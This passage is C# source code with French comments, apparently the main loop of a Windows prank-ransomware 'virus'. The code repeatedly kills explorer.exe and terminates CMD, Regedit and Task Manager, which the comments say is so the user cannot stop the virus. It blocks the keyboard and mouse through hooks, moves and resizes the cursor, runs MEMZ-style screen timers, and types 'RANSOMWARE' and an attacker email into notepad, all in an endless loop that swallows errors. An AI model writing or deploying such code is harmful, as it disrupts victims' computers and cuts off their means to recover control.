                    CMD.CMD_killExplorer();                                                                                                                                                         // Mettre fin au processus (taskkill) explorer.exe (explorateur); Si une fenetre explorer est ouverte est ouverte, elle sera fermée. Si il n'y en n'a pas, le bureau et la barre des taches disparetterons et tout deviendra noir (pas les autres app comme Google) = --> Embêter l'utilisateur (C.|E|.L)
                    /*                                                                                                                                                                             //#                                                                                                                                                                                                                                                                              /*
                    cbCursorSize = "5";                                                                                                                                                           // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 5 = le plus grand)---------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                                                                      // Conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize                                                                                                                                                                             |--| Modifier la taille du | = --> Embêter l'utilisateur
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                                                          // Déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (5 - 1) = 0x20 + 0x10 * 4 = 0x20 + 0x40 = 0x60 = 96)                                                                                     |--| curseur de la souris  |             (C.|E|.L)
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                                                             // Déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 5 [le plus grand] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (5 - 1) = 0x20 + 0x10 * 4 = 0x20 + 0x40 = 0x60 = 96)---------------------------------------------------|
                    /*                                                                                                                                                                        //#                                                                                                                                                                                                                                                                                   */
                    System.Diagnostics.Process.Start("https://www.google.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");                                            // Ouverture de la page Google avec le mot clé (recherche) "Ransomware" grace à la fonction "System.Diagnostics.Process.Start" qui permet d'ouvir un programme ou un lien internet --> Embêter l'utilisateur (C.|E|.L)
                    /*                                                                                                                                                                      //#                                                                                                                                                                                                                                                                                     */
                    System.Threading.Thread.Sleep(entier--);                                                                                                                               // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier--)
                    this._gHook.Stop_key();                                                                                                                                               // Arrêter le hook du clavier (désactivation du clavier) donc réactivation du clavier
                    timer1.Stop();                                                                                                                                                       // Arrêter le timer1 (timer1 = copier l'écran et le mettre un l'infini, comme le virus Memz)
                    Programtxt();                                                                                                                                                       // Lancer le programme bloc-note (notepad.exe)
                    this._gHook.Start_mouse();                                                                                                                                         // Lancer le hook de la souris (désactivation de la souris) donc --> Embêter l'utilisateur (C.|E|.L)
                    SendKeys.Send("RANSOMWARE{ENTER}");                                                                                                                               // Envoyer les touches "RANSOMWARE + Entrer (Return)" au clavier (notepad.exe) --> Embêter l'utilisateur (C.|E|.L)
                    CMD.CMD_startExplorer();                                                                                                                                         // Lancer le processus (start dans CMD) explorer.exe (explorateur)
                    CMD.CMD_rtc();                                                                                                                                                  // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    /*                                                                                                                                                             //#                                                                                                                                                                                                                                                                                              */
                    cbCursorSize = "2";                                                                                                                                           // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 2 = le plus petit)-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                                                      // Conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize                                                                                                                                                                                             |--| Modifier la taille du | = --> Embêter l'utilisateur
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                                          // Déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (2 - 1) = 0x20 + 0x10 * 1 = 0x20 + 0x10 = 0x30 = 48)                                                                                                     |--| curseur de la souris  |             (C.|E|.L)
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                                             // Déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 2 [le plus petit] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (2 - 1) = 0x20 + 0x10 * 1 = 0x20 + 0x10 = 0x30 = 48)-------------------------------------------------------------------|
                    /*                                                                                                                                                        //#                                                                                                                                                                                                                                                                                                   */
                    anim_NCS.Del_NCS_Ani2();                                                                                                                                 // Mettre la deuxième animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation plus rapide que la première ]
                    CMD.CMD_rtc();                                                                                                                                          // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    System.Threading.Thread.Sleep(entier--);                                                                                                               // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier--)
                    anim_NCS.Del_NCS_Ani2();                                                                                                                              // Mettre la deuxième animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation plus rapide que la première ]
                    /*                                                                                                                                                   //#                                                                                                                                                                                                                                                                                                        */
                    cbCursorSize = "9";                                                                                                                                 // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (ici 9 = le plus grand)-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                                            // Conversion de la variable cbCursorSize en Int32 (entier int) et stocker dans la variable cursorSize                                                                                                                                                                                                       |--| Modifier la taille du | = --> Embêter l'utilisateur
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                                                // Déclaration de la variable parsedCursorSize qui permet de calculer la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (9 - 1) = 0x20 + 0x10 * 8 = 0x20 + 0x80 = 0xA0 = 160)                                                                                                              |--| curseur de la souris  |             (C.|E|.L)
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                                                   // Déclaration de la fonction "SystemParametersInfo" qui permet de changer la taille du curseur en 9 [le plus grand] (0x2029 = 0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (9 - 1) = 0x20 + 0x10 * 8 = 0x20 + 0x80 = 0xA0 = 160)----------------------------------------------------------------------------|
                    /*                                                                                                                                              //#                                                                                                                                                                                                                                                                                                             */
                    SendKeys.Send("ware.ransom@yahoo.com !");                                                                                                      // Envoyer le texte par simuler l'écriture au clavier (SendKeys.Send) : "ware.ransom@yahoo.com !" (mail de l'attaquant)
                    CMD.CMD_killExplorer();                                                                                                                       // Mettre fin au processus (taskkill): Explorer.exe (Explorateur Windows); Si une fenetre explorer est ouverte est ouverte, elle sera fermée. Si il n'y en n'a pas, le bureau et la barre des taches disparetterons et tout deviendra noir (pas les autres app comme Google) = --> Embêter l'utilisateur (C.|E|.L) 
                    /*                                                                                                                                           //#                                                                                                                                                                                                                                                                                                                */
                    this._gHook.Start_key();                                                                                                                    // Démarrage du hook clavier (hook clavier = intercepter les touches du clavier) pour bloquer les touches du clavier
                    /*                                                                                                                                         //#                                                                                                                                                                                                                                                                                                                  */
                    timer1.Start();                                                                                                                           // Démarrage du timer1 (timer1 = timer qui permet de faire une action après un certain temps) = --> Embêter l'utilisateur (C.|E|.L)
                    /*                                                                                                                                       //#                                                                                                                                                                                                                                                                                                                    */
                    this._gHook.Stop_mouse();                                                                                                               // Arrêt du hook souris (hook souris = intercepter les mouvements de la souris) pour bloquer les mouvements de la souris
                    CMD.CMD_rtc();                                                                                                                         // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    /*                                                                                                                                    //#                                                                                                                                                                                                                                                                                                                       */
                    SetCursorPos(500, 5);                                                                                                                // Déplacer le curseur de la souris à la position (500, 5)-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    System.Threading.Thread.Sleep(entier++);                                                                                            // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier++)                                                                                                                                                                                                                       |--|  Déplacer le curseur de   |_
                    SetCursorPos(1000, 891);                                                                                                           // Déplacer le curseur de la souris à la position (1000, 891)                                                                                                                                                                                                                                                                |--| la souris à une position   _|--> Embêter l'utilisateur (C.|E|.L)
                    System.Threading.Thread.Sleep(entier++);                                                                                          // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier++)                                                                                                                                                                                                                         |--|    pécise sur l'écran     |
                    SetCursorPos(60, 967);                                                                                                           // Déplacer le curseur de la souris à la position (60, 967)--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    /*                                                                                                                              //#                                                                                                                                                                                                                                                                                                                             */
                    CMD.CMD_startExplorer();                                                                                                       // Démarrer le processus (start): Explorer.exe (Explorateur Windows); Si une fenetre explorer est ouverte est ouverte, elle sera fermée. Si il n'y en n'a pas, le bureau et la barre des taches disparetterons et tout deviendra noir (pas les autres app comme Google) = --> Embêter l'utilisateur (C.|E|.L)
                    /*                                                                                                                            //#                                                                                                                                                                                                                                                                                                                               */
                    cbCursorSize = "3";                                                                                                          // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (3 = 0x20 + 0x10 * (3 - 1) = 0x20 + 0x10 * 2 = 0x20 + 0x20 = 0x40 = 64)----------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                                     // Convertion de la variable cbCursorSize en entier (Int32.Parse)                                                                                                                                                                                                                                                                   |--|  Modifier la taille du     | = --> Embêter l'utilisateur (C.|E|.L)
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                                         // Déclaration de la variable parsedCursorSize qui permet de définir la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (3 - 1) = 0x20 + 0x10 * 2 = 0x20 + 0x20 = 0x40 = 64)                                                                                                                                       |--|  curseur de la souris      |
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                            // Modifier la taille du curseur (SystemParametersInfo)-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    /*                                                                                                                       //#                                                                                                                                                                                                                                                                                                                                    */
                    CMD.CMD_rtc();                                                                                                          // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    System.Threading.Thread.Sleep(entier--);                                                                               // Mettre en pause le programme pendant le temps aléatoire généré par la variable "entier" (entier--)
                    this._gHook.Stop_key();                                                                                               // Arrêt du hook clavier (hook clavier = intercepter les touches du clavier) pour bloquer les touches du clavier
                    CMD.CMD_killExplorer();                                                                                              // Mettre fin au processus (taskkill): Explorer.exe (Explorateur Windows) = --> Limiter (C.E.|L|)
                    CMD.CMD_rtc();                                                                                                      // Mettre fin au processus (taskkill): CMD; Regedit(Registre); Taskmrg (Gestionnaires des taches) pour que l'utilisateur ne puisse pas nuire au virus = --> Limiter (C.E.|L|)
                    /*                                                                                                                 //#                                                                                                                                                                                                                                                                                                                                          */
                    cbCursorSize = "8";                                                                                               // Déclaration de la variable cbCursorSize qui permet de définir la taille du curseur (8 = 0x20 + 0x10 * (8 - 1) = 0x20 + 0x10 * 7 = 0x20 + 0x70 = 0x90 = 144)--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    cursorSize = Int32.Parse(cbCursorSize);                                                                          // Convertion de la variable cbCursorSize en entier (Int32.Parse)                                                                                                                                                                                                                                                                              |--|  Modifier la taille du     | = --> Embêter l'utilisateur (C.|E|.L)
                    parsedCursorSize = 0x20 + 0x10 * (cursorSize - 1);                                                              // Déclaration de la variable parsedCursorSize qui permet de définir la taille du curseur (0x20 + 0x10 * (cursorSize - 1) = 0x20 + 0x10 * (8 - 1) = 0x20 + 0x10 * 7 = 0x20 + 0x70 = 0x90 = 144)                                                                                                                                                 |--|  curseur de la souris      |
                    SystemParametersInfo(0x2029, 0, (uint)parsedCursorSize, 0x01);                                                 // Modifier la taille du curseur (SystemParametersInfo)------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
                    /*                                                                                                            //#                                                                                                                                                                                                                                                                                                                                               */
                    anim_NCS.Del_NCS_Ani2();                                                                                     // Mettre la deuxième animation + son (Bip) sur les Led : Num, Caps et Scroll [ animation plus rapide que la première ]
                    CMD.CMD_startExplorer();                                                                                    // Démarrer le processus (start): Explorer.exe (Explorateur Windows); Si une fenetre explorer est ouverte est ouverte, elle sera fermée. Si il n'y en n'a pas, le bureau et la barre des taches disparetterons et tout deviendra noir (pas les autres app comme Google) = --> Embêter l'utilisateur (C.|E|.L)
                    CMD.CMD_startExplorer();                                                                                   // Démarrer le processus (start): Explorer.exe (Explorateur Windows); Si une fenetre explorer est ouverte est ouverte, elle sera fermée. Si il n'y en n'a pas, le bureau et la barre des taches disparetterons et tout deviendra noir (pas les autres app comme Google) = --> Embêter l'utilisateur (C.|E|.L)
                    Gdi_Load();                                                                                               // Gdi_load = démarrer tout les timers (timer 1 à 4) en même temps --> Embêter l'utilisateur (C.|E|.L)
                }
                catch (System.Exception) { }; // Si une erreur est détectée, le programme ne s'arrête pas et continue son exécution
                infini = infini++;           // Ajouter 1 à la variable "infini" pour que la boucle "infini" soit infini
            }

        }

        
    }


    //public partial class

}

//namespace